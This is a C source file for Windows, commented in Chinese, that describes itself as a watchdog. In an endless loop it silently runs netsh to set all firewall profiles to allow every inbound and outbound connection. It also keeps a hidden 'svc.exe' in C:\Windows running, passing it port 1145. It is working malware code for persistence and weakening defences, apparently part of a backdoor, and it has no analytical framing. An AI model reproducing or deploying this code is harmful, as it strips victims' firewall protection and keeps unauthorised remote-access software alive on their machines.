#include <windows.h>
#include <tlhelp32.h>

#define MASTER_PATH L"C:\\Windows\\svc.exe"
#define MASTER_EXE  L"svc.exe"
#define DEFAULT_PORT 1145

// 检查指定进程是否存在
int ProcessExists(const wchar_t *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    int found = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (wcsicmp(pe.szExeFile, name) == 0) { found = 1; break; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

// 关闭防火墙（允许所有入站/出站连接） 阻塞等待执行完成
void ConfigureFirewall() {
    WCHAR cmd[] = L"C:\\Windows\\System32\\netsh.exe advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound";
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        // 阻塞等待 netsh.exe 执行完毕
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// 启动 svc.exe（非阻塞，不等待进程结束）
void StartMaster() {
    // 获取当前可执行文件的完整路径（即看门狗自身）
    WCHAR selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    // 命令行格式：svc.exe "<看门狗路径>" <端口>
    static WCHAR cmd[65536];
    wsprintfW(cmd, L"\"%s\" \"%s\" %d", MASTER_PATH, selfPath, DEFAULT_PORT);
    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        // 不等待子进程，直接关闭句柄并返回
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

int main() {
    // 主循环：关闭防火墙（阻塞等待），确保 svc.exe 持续运行（非阻塞启动）
    while (1) {
        ConfigureFirewall();          // 阻塞式防火墙配置
        if (!ProcessExists(MASTER_EXE)) {
            StartMaster();            // 非阻塞式进程启动
        }
        // 可选的短暂休眠以降低 CPU 占用，这里省略以保持即时响应
    }
    return 0;
}